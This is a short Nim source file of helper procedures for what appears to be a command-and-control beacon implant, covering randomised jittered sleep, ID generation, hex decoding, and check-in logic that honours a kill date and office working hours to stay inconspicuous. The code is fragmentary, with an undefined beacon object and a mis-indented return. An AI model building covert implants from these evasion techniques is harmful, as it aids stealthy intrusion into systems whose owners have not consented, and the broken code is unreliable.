import os, times, random
import sequtils

proc randomSleep*(minSec: int, maxSec: int) =
  let diff = maxSec - minSec
  let randVal = rand(diff) + minSec
  sleep(randVal * 1000)

proc genID*: string =
  let chars = "abcdef0123456789"
  var s = ""
  for i in 0 ..< 16:
    s &= chars[rand(chars.len-1)]
  s

proc hexToBytes*(hex: string): seq[byte] =
  ## Convert hex string into bytes
  result = newSeq[byte](hex.len div 2)
  for i in 0 ..< result.len:
    result[i] = parseHexInt(hex[i*2 .. i*2+1]).byte

proc calculateSleep*(): int =
  let jitterFactor = (rand(200) - 100) / 100.0  # -1.0 to +1.0
  let variance = (beacon.jitter.float / 100.0) * jitterFactor
  result = int(beacon.sleepTime.float * (1.0 + variance))

proc shouldCheckIn*(): bool =
  ## Check if beacon should actually check in
  ## Respect working hours, kill date, etc.
  # Check kill date

  if now() > beacon.killDate:
    quit(0) 

  # Check working hours (optional)
  let currentHour = now().hour
  if currentHour < 8 or currentHour >= 18:
  return false
  if now().weekday in {dMon, dTue, dWed, dThu, dFri}:
    return true
  return false